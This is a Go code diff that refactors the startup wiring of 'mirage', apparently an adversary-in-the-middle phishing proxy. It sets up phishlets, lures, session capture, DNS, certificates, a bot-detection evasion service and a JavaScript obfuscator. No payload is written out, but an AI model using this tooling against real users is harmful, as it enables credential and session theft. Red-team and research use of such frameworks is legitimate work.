@@ -1,4 +1,4 @@
-package main
+package daemon
 
 import (
 	"context"
@@ -23,167 +23,256 @@ import (
 	"github.com/travisbale/mirage/internal/store/sqlite"
 )
 
-// NewDaemon constructs and fully wires a Daemon. Returns an error if any
-// subsystem fails to initialise — no partial startup.
-func NewDaemon(ctx context.Context, configPath string, developer bool, logger *slog.Logger) (*Daemon, error) {
-	daemon := &Daemon{configPath: configPath, logger: logger}
+type scriptObfuscator interface {
+	Obfuscate(ctx context.Context, html []byte) ([]byte, error)
+	Shutdown(ctx context.Context) error
+}
 
-	// Load and validate config.
+// Daemon is the fully-wired daemon. One instance per process.
+type Daemon struct {
+	configPath string
+	logger     *slog.Logger
+
+	cfg *config.Config
+
+	// Infrastructure.
+	db                *sqlite.DB
+	bus               *events.Bus
+	dnsService        *aitm.DNSService
+	watcher           *phishlet.Watcher
+	phishletReloadSub <-chan aitm.Event
+
+	// Proxy.
+	proxy *proxy.AITMProxy
+
+	// JS obfuscator — always non-nil after New (no-op when disabled).
+	obfuscator scriptObfuscator
+
+	// Services needed by health check and reload.
+	phishletStore *sqlite.Phishlets
+	sessionSvc    *aitm.SessionService
+}
+
+// initializer carries transient build-time state
+type initializer struct {
+	*Daemon
+
+	lureStore       *sqlite.Lures
+	resolver        *aitm.PhishletResolver
+	activeHostnames *proxy.ActiveHostnameSet
+	activeCount     int
+	zones           map[string]aitm.ZoneConfig
+	certSource      *cert.SelfSignedCertSource
+	botStore        *sqlite.Bots
+	botGuardSvc     *aitm.BotGuardService
+	sessionStore    aitm.SessionStore
+	lureSvc         *aitm.LureService
+	blacklistSvc    *aitm.BlacklistService
+	spoofProxy      *proxy.SpoofProxy
+	wsHub           *proxy.WSHub
+}
+
+// New constructs and fully wires a Daemon. Returns an error if any
+// subsystem fails to initialise — no partial startup.
+func New(ctx context.Context, configPath string, developer bool, version string, logger *slog.Logger) (*Daemon, error) {
 	cfg, err := loadConfig(configPath)
 	if err != nil {
 		return nil, err
 	}
-	daemon.cfg = cfg
 
-	// Open SQLite store.
-	db, err := sqlite.Open(cfg.DBPath)
-	if err != nil {
-		return nil, fmt.Errorf("opening database: %w", err)
+	ini := &initializer{
+		Daemon: &Daemon{
+			configPath: configPath,
+			logger:     logger,
+			cfg:        cfg,
+			bus:        events.NewBus(events.DefaultBufferSize),
+		},
 	}
-	daemon.db = db
 
-	// Init event bus.
-	daemon.bus = events.NewBus(events.DefaultBufferSize)
-
-	// Load phishlet defs from disk and register them in the resolver.
-	daemon.phishletStore = sqlite.NewPhishletStore(db)
-	lureStore := sqlite.NewLureStore(db)
-	resolver := aitm.NewPhishletResolver(daemon.phishletStore, lureStore)
-	activeHostnames := &proxy.ActiveHostnameSet{}
-
-	daemon.loadPhishletDefs(cfg.PhishletsDir, resolver)
-
-	activeCount, zones, err := daemon.populateActivePhishlets(cfg.ExternalIPv4, activeHostnames)
-	if err != nil {
+	if err := ini.initStore(); err != nil {
+		return nil, err
+	}
+	if err := ini.initPhishlets(); err != nil {
+		return nil, err
+	}
+	if err := ini.initDNS(); err != nil {
+		return nil, err
+	}
+	if err := ini.initCerts(developer); err != nil {
+		return nil, err
+	}
+	if err := ini.initServices(); err != nil {
+		return nil, err
+	}
+	if err := ini.initProxy(version); err != nil {
 		return nil, err
 	}
 
-	// Init DNS providers and service.
-	dnsProviders, err := dns.BuildProviders(cfg.DNSProviders, cfg.ExternalIPv4, cfg.DNSPort)
-	if err != nil {
-		return nil, fmt.Errorf("initializing DNS providers: %w", err)
-	}
-	daemon.dnsService = aitm.NewDNSService(dnsProviders, zones, daemon.bus)
+	ini.initWatcher()
 
-	// Init cert source.
-	caDir := filepath.Join(filepath.Dir(cfg.DBPath), "ca")
-	certSource, err := cert.NewSource(developer, caDir, daemon.logger)
+	logger.Info("miraged ready",
+		"version", version,
+		"domain", cfg.Domain,
+		"https_port", cfg.HTTPSPort,
+		"api_hostname", cfg.API.SecretHostname,
+		"active_phishlets", ini.activeCount,
+	)
+
+	return ini.Daemon, nil
+}
+
+func (ini *initializer) initStore() error {
+	db, err := sqlite.Open(ini.cfg.DBPath)
 	if err != nil {
-		return nil, err
+		return fmt.Errorf("opening database: %w", err)
+	}
+	ini.db = db
+
+	return nil
+}
+
+func (ini *initializer) initPhishlets() error {
+	ini.phishletStore = sqlite.NewPhishletStore(ini.db)
+	ini.lureStore = sqlite.NewLureStore(ini.db)
+	ini.resolver = aitm.NewPhishletResolver(ini.phishletStore, ini.lureStore)
+	ini.activeHostnames = &proxy.ActiveHostnameSet{}
+
+	ini.loadPhishletDefs(ini.cfg.PhishletsDir, ini.resolver)
+
+	activeCount, zones, err := ini.populateActivePhishlets(ini.cfg.ExternalIPv4, ini.activeHostnames)
+	if err != nil {
+		return err
 	}
 
-	// Init botguard.
-	botStore := sqlite.NewBotStore(db)
-	botGuardSvc := &aitm.BotGuardService{
+	ini.activeCount = activeCount
+	ini.zones = zones
+
+	return nil
+}
+
+func (ini *initializer) initDNS() error {
+	providers, err := dns.BuildProviders(ini.cfg.DNSProviders, ini.cfg.ExternalIPv4, ini.cfg.DNSPort)
+	if err != nil {
+		return fmt.Errorf("initializing DNS providers: %w", err)
+	}
+	ini.dnsService = aitm.NewDNSService(providers, ini.zones, ini.bus)
+
+	return nil
+}
+
+func (ini *initializer) initCerts(developer bool) error {
+	caDir := filepath.Join(filepath.Dir(ini.cfg.DBPath), "ca")
+
+	src, err := cert.NewSource(developer, caDir, ini.logger)
+	if err != nil {
+		return err
+	}
+	ini.certSource = src
+
+	return nil
+}
+
+func (ini *initializer) initServices() error {
+	ini.botStore = sqlite.NewBotStore(ini.db)
+	ini.botGuardSvc = &aitm.BotGuardService{
 		Scorer: &botguard.Scorer{
 			Config: botguard.BotGuardConfig{
 				Enabled:            true,
 				TelemetryThreshold: 0.6,
 			},
-			SignatureFinder: botStore,
-			Logger:          daemon.logger,
+			SignatureFinder: ini.botStore,
+			Logger:          ini.logger,
 		},
-		Store: botStore,
-		Bus:   daemon.bus,
+		Store: ini.botStore,
+		Bus:   ini.bus,
 	}
 
-	// Wire services.
-	sessionStore := sqlite.NewSessionStore(db)
-	daemon.sessionSvc = &aitm.SessionService{Store: sessionStore, Bus: daemon.bus}
-	lureSvc := &aitm.LureService{Store: lureStore}
-	blacklistSvc := aitm.NewBlacklistService(daemon.bus)
+	ini.sessionStore = sqlite.NewSessionStore(ini.db)
+	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
+	ini.lureSvc = &aitm.LureService{Store: ini.lureStore}
+	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
+	ini.spoofProxy = proxy.NewSpoofProxy("")
+	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)
 
-	spoofProxy := proxy.NewSpoofProxy("")
-	wsHub := proxy.NewWSHub(daemon.bus, daemon.logger)
-
-	// Build API handler.
-	apiHandler := api.NewRouter(api.RouterDeps{
-		Sessions:  daemon.sessionSvc,
-		Lures:     lureSvc,
-		Phishlets: daemon.phishletStore,
-		Blacklist: blacklistSvc,
-		Botguard:  botStore,
-		Bus:       daemon.bus,
-		Domain:    cfg.Domain,
-		Version:   Version,
-		Logger:    daemon.logger,
-	})
-
-	// Init JS obfuscator — defaults to no-op; upgraded to Node sidecar when enabled.
-	daemon.obfuscator = &obfuscator.NoOpObfuscator{}
-	if cfg.Obfuscator.Enabled {
-		n, err := obfuscator.NewNodeObfuscator(cfg.Obfuscator, daemon.logger)
-		if err != nil {
-			daemon.logger.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
-		} else {
-			daemon.obfuscator = n
-		}
-	}
-
-	// Build pipeline and proxy.
-	pipeline := buildPipeline(pipelineDeps{
-		botGuardSvc:      botGuardSvc,
-		blacklistSvc:     blacklistSvc,
-		sessionSvc:       daemon.sessionSvc,
-		sessionStore:     sessionStore,
-		phishletResolver: resolver,
-		activeHostnames:  activeHostnames,
-		spoofProxy:       spoofProxy,
-		bus:              daemon.bus,
-		apiHandler:       apiHandler,
-		apiHostname:      cfg.API.SecretHostname,
-		obfuscator:       daemon.obfuscator,
-	}, daemon.logger)
-
-	aitmProxy := &proxy.AITMProxy{
-		CertSource: certSource,
-		Pipeline:   pipeline,
-		WSHub:      wsHub,
-		Spoof:      spoofProxy,
-		Logger:     daemon.logger,
-	}
-
-	if cfg.API.SecretHostname != "" {
-		clientCA, err := loadOrGenerateCA(cfg.API.ClientCACertPath, daemon.logger)
-		if err != nil {
-			return nil, err
-		}
-		if err := issueOperatorCert(clientCA, cfg.API.ClientCACertPath, daemon.logger); err != nil {
-			return nil, err
-		}
-		aitmProxy.SecretHostname = cfg.API.SecretHostname
-		aitmProxy.ClientCAs = clientCA.CertPool()
-		daemon.logger.Info("API enabled", "hostname", cfg.API.SecretHostname, "ca_cert", cfg.API.ClientCACertPath)
-	}
-	daemon.proxy = aitmProxy
-
-	// Start phishlet file watcher. Non-fatal — live reload is optional.
-	daemon.watcher, err = phishlet.NewWatcher(cfg.PhishletsDir, daemon.bus)
-	if err != nil {
-		daemon.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
-	} else {
-		daemon.phishletReloadSub = events.SubscribeFunc(daemon.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
-			if def, ok := ev.Payload.(*aitm.PhishletDef); ok {
-				resolver.RegisterDef(def)
-			}
-		})
-		daemon.watcher.Start()
-	}
-
-	daemon.logger.Info("miraged ready",
-		"version", Version,
-		"domain", cfg.Domain,
-		"https_port", cfg.HTTPSPort,
-		"api_hostname", cfg.API.SecretHostname,
-		"active_phishlets", activeCount,
-	)
-
-	return daemon, nil
+	return nil
 }
 
-// populateActivePhishlets reads all stored phishlet configs and populates
-// activeHostnames and DNS zones from the enabled ones. Returns the count of
-// enabled phishlets and the zone map for the DNS service.
+func (ini *initializer) initProxy(version string) error {
+	apiHandler := api.NewRouter(api.RouterDeps{
+		Sessions:  ini.sessionSvc,
+		Lures:     ini.lureSvc,
+		Phishlets: ini.phishletStore,
+		Blacklist: ini.blacklistSvc,
+		Botguard:  ini.botStore,
+		Bus:       ini.bus,
+		Domain:    ini.cfg.Domain,
+		Version:   version,
+		Logger:    ini.logger,
+	})
+
+	ini.obfuscator = &obfuscator.NoOpObfuscator{}
+	if ini.cfg.Obfuscator.Enabled {
+		nodeObfuscator, err := obfuscator.NewNodeObfuscator(ini.cfg.Obfuscator, ini.logger)
+		if err != nil {
+			ini.logger.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
+		} else {
+			ini.obfuscator = nodeObfuscator
+		}
+	}
+
+	pipeline := buildPipeline(pipelineDeps{
+		botGuardSvc:      ini.botGuardSvc,
+		blacklistSvc:     ini.blacklistSvc,
+		sessionSvc:       ini.sessionSvc,
+		sessionStore:     ini.sessionStore,
+		phishletResolver: ini.resolver,
+		activeHostnames:  ini.activeHostnames,
+		spoofProxy:       ini.spoofProxy,
+		bus:              ini.bus,
+		apiHandler:       apiHandler,
+		apiHostname:      ini.cfg.API.SecretHostname,
+		obfuscator:       ini.obfuscator,
+	}, ini.logger)
+
+	aitmProxy := &proxy.AITMProxy{
+		CertSource: ini.certSource,
+		Pipeline:   pipeline,
+		WSHub:      ini.wsHub,
+		Spoof:      ini.spoofProxy,
+		Logger:     ini.logger,
+	}
+
+	clientCA, err := loadOrGenerateCA(ini.cfg.API.ClientCACertPath, ini.logger)
+	if err != nil {
+		return err
+	}
+	if err := issueOperatorCert(clientCA, ini.cfg.API.ClientCACertPath, ini.logger); err != nil {
+		return err
+	}
+	aitmProxy.SecretHostname = ini.cfg.API.SecretHostname
+	aitmProxy.ClientCAs = clientCA.CertPool()
+	ini.logger.Info("API enabled", "hostname", ini.cfg.API.SecretHostname, "ca_cert", ini.cfg.API.ClientCACertPath)
+
+	ini.proxy = aitmProxy
+
+	return nil
+}
+
+func (ini *initializer) initWatcher() {
+	var err error
+	ini.watcher, err = phishlet.NewWatcher(ini.cfg.PhishletsDir, ini.bus)
+	if err != nil {
+		ini.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
+		return
+	}
+	ini.phishletReloadSub = events.SubscribeFunc(ini.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
+		if def, ok := ev.Payload.(*aitm.PhishletDef); ok {
+			ini.resolver.RegisterDef(def)
+		}
+	})
+	ini.watcher.Start()
+}
+
 func (d *Daemon) populateActivePhishlets(externalIP string, activeHostnames *proxy.ActiveHostnameSet) (int, map[string]aitm.ZoneConfig, error) {
 	configs, err := d.phishletStore.ListPhishletConfigs()
 	if err != nil {
@@ -210,29 +299,31 @@ func (d *Daemon) populateActivePhishlets(externalIP string, activeHostnames *pro
 	return activeCount, zones, nil
 }
 
-// loadPhishletDefs walks dir and registers all parseable phishlet YAML files
-// with the resolver. Parse errors are logged and skipped — non-fatal.
 func (d *Daemon) loadPhishletDefs(dir string, resolver *aitm.PhishletResolver) {
 	entries, err := os.ReadDir(dir)
 	if err != nil {
 		d.logger.Warn("could not read phishlets directory", "dir", dir, "error", err)
 		return
 	}
+
 	loader := &phishlet.Loader{}
 	for _, entry := range entries {
 		if entry.IsDir() {
 			continue
 		}
+
 		name := strings.ToLower(entry.Name())
 		if !strings.HasSuffix(name, ".yaml") && !strings.HasSuffix(name, ".yml") {
 			continue
 		}
+
 		path := filepath.Join(dir, entry.Name())
 		def, err := loader.Load(path)
 		if err != nil {
 			d.logger.Warn("failed to load phishlet", "path", path, "error", err)
 			continue
 		}
+
 		resolver.RegisterDef(def)
 		d.logger.Info("loaded phishlet", "name", def.Name)
 	}
@@ -243,35 +334,38 @@ func loadConfig(path string) (*config.Config, error) {
 	if err != nil {
 		return nil, fmt.Errorf("loading config: %w", err)
 	}
+
 	if err := cfg.Validate(); err != nil {
 		return nil, fmt.Errorf("invalid config: %w", err)
 	}
+
 	return cfg, nil
 }
 
-// issueOperatorCert issues a client certificate for the default operator if
-// one does not already exist. The cert and key are written alongside the CA
-// cert, using the same base path with an "operator" stem.
 func issueOperatorCert(ca *api.CA, caCertPath string, logger *slog.Logger) error {
 	dir := filepath.Dir(caCertPath)
 	certPath := filepath.Join(dir, "operator.crt")
 	keyPath := filepath.Join(dir, "operator.key")
 
 	if _, err := os.Stat(certPath); err == nil {
-		return nil // already exists
+		return nil
 	}
 
 	certPEM, keyPEM, err := ca.IssueClientCert("operator")
 	if err != nil {
 		return fmt.Errorf("issuing operator client cert: %w", err)
 	}
+
 	if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
 		return fmt.Errorf("writing operator cert: %w", err)
 	}
+
 	if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
 		return fmt.Errorf("writing operator key: %w", err)
 	}
+
 	logger.Info("issued operator client certificate", "cert", certPath, "key", keyPath)
+
 	return nil
 }
 
@@ -280,13 +374,17 @@ func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
 		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
 			return nil, fmt.Errorf("creating CA directory: %w", err)
 		}
+
 		ca, err := api.GenerateCA(certPath)
 		if err != nil {
 			return nil, fmt.Errorf("generating API CA: %w", err)
 		}
+
 		logger.Info("generated API client CA", "cert", certPath)
+
 		return ca, nil
 	}
+
 	return api.Load(certPath)
 }
 
